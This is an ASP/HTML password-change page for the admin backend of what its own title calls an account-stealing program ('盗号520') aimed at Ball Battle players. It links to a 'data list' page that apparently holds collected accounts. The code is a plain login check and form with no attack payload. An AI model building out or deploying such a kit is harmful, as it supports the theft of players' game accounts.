<%@LANGUAGE="VBScript" codepage="936"%>
<!--#include file="conn.asp"-->
<%
set rs=server.createobject("adodb.recordset")
sql="select id,admin,password from admin order by id desc"
rs.open sql,conn,1,3

If session("admin")="" then
    Response.Write "<script>alert('用户未登录，请登录');top.location.href='login.asp';</SCRIPT>"
	Response.End
End If
%>
<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>修改密码-盗号520程序</title>
  <link href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css" rel="stylesheet"/>
  <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script>
  <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
  
  <!--[if lt IE 9]>
    <script src="http://libs.useso.com/js/html5shiv/3.7/html5shiv.min.js"></script>
    <script src="http://libs.useso.com/js/respond.js/1.4.2/respond.min.js"></script>
  <![endif]-->
</head>
<body>
  <nav class="navbar navbar-fixed-top navbar-default">
    <div class="container">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
          <span class="sr-only">导航按钮</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="./">盗号520---球球大作战后台</a>
      </div><!-- /.navbar-header -->
      <div id="navbar" class="collapse navbar-collapse">
       <ul class="nav navbar-nav navbar-right">
		 <li>
           <a href="index.asp"><span class="glyphicon glyphicon-home"></span> 后台首页</a></li>
          <li>
           <a href="list.asp"><span class="glyphicon glyphicon-signal"></span> 数据列表</a>
          </li>
		  <li class="active" ><a href="password.asp"><span class="glyphicon glyphicon-transfer"></span> 修改密码</a></li>
		    <li><a href="about.asp"><span class="glyphicon glyphicon-tree-deciduous"></span> 关于程序</a></li>
			<li><a href="Exit.asp" target="_parent" ONCLICK="javascript:return confirm('提示：您确定要退出吗？')"><span class="glyphicon glyphicon-log-out"></span> 退出登录</a></li>
        </ul>
      </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
  </nav><!-- /.navbar -->
  <div class="container" style="padding-top:70px;">
   <div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">
  <div class="row">
			<div class="col-lg-12">
				<div class="panel panel-danger">
					<div class="panel-heading"><span class="glyphicon glyphicon-stats"><span> 密码修改</div>
					<div class="panel-body">
<form action="pass_modify.asp" method="post" name="pass" id="pass" onSubmit="return checkForm();">
  <div class="input-group">
              <span class="input-group-addon"><span class="glyphicon glyphicon-user"></span></span>
              <input type="text" name="adminname" id="adminname" class="form-control" value="<%=session("admin")%>" readonly/>
            </div><br/>
            <div class="input-group">
              <span class="input-group-addon"><span class="glyphicon glyphicon-lock"></span></span>
              <input type="password" name="password" id="password" class="form-control" placeholder="请输入新密码" required="required"/>
            </div><br/>
            <div class="form-group">
              <div class="col-xs-14"><input name="Submit2" type="submit" value="确定修改" class="btn btn-primary form-control"/></div>
            </div> </div> </div> </div> </div> </div> </div>
			
   

<script language="javascript">
function checkForm()
{

	if (document.pass.password.value == ""){
		alert ("请输入要修改的密码！");
		document.pass.password.focus();
	return false;
	}
	if (document.pass.password.value.length < 5 ){
		alert ("密码不能低于5位！");
		document.pass.password.focus();
		return false;
	}
 }
</script>
</body>
</html>